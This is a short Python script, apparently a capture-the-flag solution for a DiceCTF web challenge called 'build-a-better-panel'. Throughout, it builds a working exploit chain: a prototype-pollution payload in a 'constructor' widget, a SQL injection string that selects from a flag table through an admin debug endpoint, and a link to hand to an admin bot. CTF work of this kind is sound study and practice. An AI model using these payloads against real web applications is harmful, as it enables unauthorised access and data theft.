import requests
import urllib.parse
import json

url = "https://build-a-better-panel.dicec.tf"

s = requests.Session()

cookie = "yoink5"
res = s.get(f"{url}/create", params={"debugid": cookie})
print("create", res.status_code)


def add(data):
    res = s.post(f"{url}/panel/add", json=data)
    print("panel/add", res.status_code)


def sql_url():
    p = cookie
    n = "flagWidget"
    d = """\"' || (SELECT * FROM flag) || '\""""
    d = urllib.parse.quote(d)
    return f"{url}/admin/debug/add_widget?panelid={p}&widgetname={n}&widgetdata={d}"


name = "constructor"
data = {"prototype": {"css": sql_url()}}
data = {
    "widgetName": name,
    "widgetData": json.dumps(data),
}

add(data)

print(f"Give admin bot {url}/create?debugid={cookie}")
